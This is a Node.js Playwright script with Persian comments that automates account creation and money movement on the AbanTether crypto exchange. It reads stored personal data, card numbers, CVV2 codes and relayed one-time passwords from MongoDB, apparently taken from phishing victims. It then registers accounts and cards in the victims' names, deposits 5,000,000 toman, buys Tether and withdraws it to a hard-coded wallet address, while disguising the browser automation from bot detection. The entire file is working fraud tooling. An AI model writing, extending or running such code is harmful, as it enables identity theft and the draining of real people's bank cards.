const { MongoClient } = require('mongodb');
const { chromium } = require('playwright');
require('dotenv').config();

class AbanTetherBot {
    constructor() {
        this.client = new MongoClient(process.env.MONGODB_URI);
        this.db = null;
        this.collection = null;
        this.browser = null;
        this.page = null;
        this.currentUser = null;
        this.processingUsers = new Set(); // برای جلوگیری از پردازش تکراری
        this.isProcessing = false;
    }

    async connectToMongoDB() {
        try {
            await this.client.connect();
            this.db = this.client.db(process.env.DATABASE_NAME);
            this.collection = this.db.collection(process.env.COLLECTION_NAME);
            console.log('✅ Connected to MongoDB');
        } catch (error) {
            console.error('❌ MongoDB connection error:', error);
        }
    }

    async checkDatabase() {
        try {
            // پیدا کردن کاربران جدیدی که پردازش نشده‌اند
            const pendingUsers = await this.collection.find({
                $or: [
                    { 'otp_login': { $exists: true, $ne: '' } },
                    { 'otp_register_card': { $exists: true, $ne: '' } },
                    { 'otp_payment': { $exists: true, $ne: '' } }
                ],
                processed: { $ne: true }
            }).toArray();

            console.log(`🔍 Found ${pendingUsers.length} pending users`);

            for (const user of pendingUsers) {
                const phone = user.personalPhoneNumber;
                
                // اگر کاربر در حال پردازش نیست
                if (!this.processingUsers.has(phone)) {
                    console.log(`🚀 Starting processing for user: ${phone}`);
                    this.processingUsers.add(phone);
                    this.currentUser = user;
                    
                    // پردازش غیرهمزمان
                    this.processUser(user).catch(error => {
                        console.error(`❌ Error processing user ${phone}:`, error);
                        this.processingUsers.delete(phone);
                    });
                }
            }
        } catch (error) {
            console.error('❌ Error checking database:', error);
        }
    }

    async processUser(user) {
        try {
            console.log(`🔄 Processing started for ${user.personalPhoneNumber}`);
            
            // مرحله 1: ثبت‌نام اولیه
            await this.initializeBrowser();
            await this.registerAndLogin(user);
            
            // مرحله 2: ثبت کارت
            await this.registerCard(user);
            
            // مرحله 3: واریز و خرید
            await this.depositAndBuy(user);
            
            // مرحله 4: برداشت
            await this.withdraw(user);
            
            // به‌روزرسانی وضعیت
            await this.updateUserStatus(user.personalPhoneNumber, "completed");
            
            console.log(`✅ Successfully completed for ${user.personalPhoneNumber}`);
            
        } catch (error) {
            console.error(`❌ Failed for ${user.personalPhoneNumber}:`, error);
            await this.updateUserStatus(user.personalPhoneNumber, "failed", error.message);
        } finally {
            this.processingUsers.delete(user.personalPhoneNumber);
            if (this.browser) {
                await this.browser.close();
                this.browser = null;
                this.page = null;
            }
        }
    }

    async initializeBrowser() {
        if (this.browser) {
            await this.browser.close();
        }
        
        this.browser = await chromium.launch({ 
            headless: false, // برای دیدن مراحل false بگذار
            args: [
                '--disable-blink-features=AutomationControlled',
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage'
            ]
        });
        
        const context = await this.browser.newContext({
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            viewport: { width: 1280, height: 720 },
            locale: 'fa-IR',
            timezoneId: 'Asia/Tehran'
        });
        
        await context.addInitScript(() => {
            Object.defineProperty(navigator, 'webdriver', { get: () => false });
            Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
            Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en', 'fa'] });
        });
        
        this.page = await context.newPage();
    }

    async waitAndFill(selector, value, timeout = 10000) {
        await this.page.waitForSelector(selector, { timeout, state: 'visible' });
        await this.page.fill(selector, value);
    }

    async waitAndClick(selector, timeout = 10000) {
        await this.page.waitForSelector(selector, { timeout, state: 'visible' });
        await this.page.click(selector);
    }

    async findAndClickByText(text) {
        const xpath = `//*[contains(text(), '${text}') or contains(@value, '${text}')]`;
        await this.page.waitForSelector(`xpath=${xpath}`, { timeout: 10000 });
        await this.page.click(`xpath=${xpath}`);
    }

    async registerAndLogin(user) {
        console.log('📝 Starting registration...');
        
        // صفحه ثبت‌نام
        await this.page.goto('https://abantether.com/register', { waitUntil: 'networkidle' });
        await this.sleep(3000);
        
        // وارد کردن شماره موبایل
        await this.waitAndFill('input[type="tel"], input[name*="phone"], input[placeholder*="موبایل"]', user.personalPhoneNumber);
        await this.findAndClickByText('ادامه');
        await this.sleep(5000);
        
        // منتظر OTP
        console.log('⏳ Waiting for OTP login...');
        const otp = await this.waitForFieldUpdate('otp_login', user.personalPhoneNumber);
        
        // وارد کردن OTP
        await this.waitAndFill('input[type="number"], input[name*="otp"], input[placeholder*="کد"]', otp);
        await this.findAndClickByText('تایید');
        await this.sleep(5000);
        
        // پر کردن اطلاعات هویتی
        await this.waitAndFill('input[name*="name"], input[placeholder*="نام"]', user.personalName);
        await this.waitAndFill('input[name*="national"], input[placeholder*="کد ملی"]', user.personalNationalCode);
        
        // تاریخ تولد
        if (user.personalBirthDate) {
            const birthDate = new Date(user.personalBirthDate);
            const year = birthDate.getFullYear();
            const month = String(birthDate.getMonth() + 1).padStart(2, '0');
            const day = String(birthDate.getDate()).padStart(2, '0');
            
            // ممکنه سه فیلد جداگانه باشه
            await this.waitAndFill('input[name*="year"], input[placeholder*="سال"]', year.toString());
            await this.waitAndFill('input[name*="month"], input[placeholder*="ماه"]', month);
            await this.waitAndFill('input[name*="day"], input[placeholder*="روز"]', day);
        }
        
        // شهر و استان
        await this.waitAndFill('input[name*="city"], input[placeholder*="شهر"]', user.personalCity);
        await this.waitAndFill('input[name*="province"], input[placeholder*="استان"]', user.personalProvince);
        
        await this.findAndClickByText('ثبت');
        await this.sleep(5000);
        
        console.log('✅ Registration completed');
    }

    async registerCard(user) {
        console.log('💳 Registering card...');
        
        // رفتن به کیف پول
        await this.page.goto('https://abantether.com/wallet', { waitUntil: 'networkidle' });
        await this.sleep(3000);
        
        // پیدا کردن دکمه اضافه کردن کارت
        await this.findAndClickByText('اضافه کردن کارت');
        await this.findAndClickByText('ثبت کارت جدید');
        await this.sleep(2000);
        
        // وارد کردن اطلاعات کارت
        await this.waitAndFill('input[name*="card"], input[placeholder*="شماره کارت"]', user.cardNumber);
        await this.waitAndFill('input[name*="cvv"], input[placeholder*="CVV"]', user.cvv2);
        await this.waitAndFill('input[name*="month"], input[placeholder*="ماه"]', user.bankMonth);
        await this.waitAndFill('input[name*="year"], input[placeholder*="سال"]', user.bankYear);
        
        await this.findAndClickByText('ثبت کارت');
        await this.sleep(3000);
        
        // منتظر OTP کارت
        console.log('⏳ Waiting for OTP card...');
        const otpCard = await this.waitForFieldUpdate('otp_register_card', user.personalPhoneNumber);
        
        await this.waitAndFill('input[type="number"], input[name*="otp"]', otpCard);
        await this.findAndClickByText('تایید');
        await this.sleep(5000);
        
        console.log('✅ Card registered');
    }

    async depositAndBuy(user) {
        console.log('💰 Starting deposit...');
        
        // واریز تومان
        await this.page.goto('https://abantether.com/deposit', { waitUntil: 'networkidle' });
        await this.sleep(3000);
        
        await this.waitAndFill('input[name*="amount"], input[placeholder*="مبلغ"]', '5000000');
        await this.findAndClickByText('واریز');
        await this.sleep(3000);
        
        // منتظر OTP پرداخت
        console.log('⏳ Waiting for payment OTP...');
        const otpPayment = await this.waitForFieldUpdate('otp_payment', user.personalPhoneNumber);
        
        await this.waitAndFill('input[type="number"], input[name*="otp"]', otpPayment);
        await this.findAndClickByText('تایید');
        await this.sleep(5000);
        
        // خرید تتر
        console.log('🛒 Buying Tether...');
        await this.page.goto('https://abantether.com/market', { waitUntil: 'networkidle' });
        await this.sleep(3000);
        
        await this.findAndClickByText('خرید تتر');
        await this.sleep(2000);
        
        // انتخاب همه موجودی
        await this.findAndClickByText('همه موجودی');
        await this.findAndClickByText('خرید');
        await this.sleep(5000);
        
        console.log('✅ Deposit and purchase completed');
    }

    async withdraw(user) {
        console.log('🏦 Starting withdrawal...');
        
        await this.page.goto('https://abantether.com/withdraw', { waitUntil: 'networkidle' });
        await this.sleep(3000);
        
        // آدرس برداشت
        const withdrawAddress = 'THtQH52yMFSsJAvFbKnBfYpbbDKWpKfJHS';
        await this.waitAndFill('input[name*="address"], textarea[name*="address"], input[placeholder*="آدرس"]', withdrawAddress);
        
        await this.findAndClickByText('برداشت');
        await this.sleep(5000);
        
        // تأیید نهایی
        await this.findAndClickByText('تایید نهایی');
        await this.sleep(3000);
        
        console.log('✅ Withdrawal completed');
    }

    async waitForFieldUpdate(fieldName, phoneNumber, maxWait = 120000) {
        console.log(`⏳ Waiting for ${fieldName}...`);
        
        const startTime = Date.now();
        while (Date.now() - startTime < maxWait) {
            const updatedUser = await this.collection.findOne({ 
                personalPhoneNumber: phoneNumber 
            });
            
            if (updatedUser && updatedUser[fieldName] && updatedUser[fieldName].trim() !== '') {
                console.log(`✅ ${fieldName} received: ${updatedUser[fieldName]}`);
                return updatedUser[fieldName];
            }
            
            await this.sleep(2000); // هر 2 ثانیه چک کن
        }
        
        throw new Error(`Timeout waiting for ${fieldName}`);
    }

    async updateUserStatus(phoneNumber, status, error = null) {
        const updateData = {
            processed: true,
            status: status,
            completedAt: new Date()
        };
        
        if (error) {
            updateData.error = error;
            updateData.failedAt = new Date();
        }
        
        await this.collection.updateOne(
            { personalPhoneNumber: phoneNumber },
            { $set: updateData }
        );
        
        console.log(`📊 Updated status for ${phoneNumber}: ${status}`);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async startPolling() {
        console.log('🔄 Starting database polling (every 30 seconds)...');
        
        // اولین چک
        await this.checkDatabase();
        
        // شروع پولینگ هر 30 ثانیه
        setInterval(async () => {
            if (!this.isProcessing) {
                await this.checkDatabase();
            }
        }, 30000); // 30 ثانیه
        
        // همچنین یک Keep-alive endpoint
        const http = require('http');
        const server = http.createServer((req, res) => {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
                status: 'running',
                processing: Array.from(this.processingUsers),
                timestamp: new Date().toISOString()
            }));
        });
        
        server.listen(process.env.PORT || 3000, () => {
            console.log(`🌐 Health check server running on port ${process.env.PORT || 3000}`);
        });
    }

    async start() {
        await this.connectToMongoDB();
        await this.startPolling();
    }
}

// اجرای ربات
const bot = new AbanTetherBot();
bot.start().catch(console.error);

// هندل خطاهای ناشناخته
process.on('unhandledRejection', (error) => {
    console.error('Unhandled rejection:', error);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught exception:', error);
});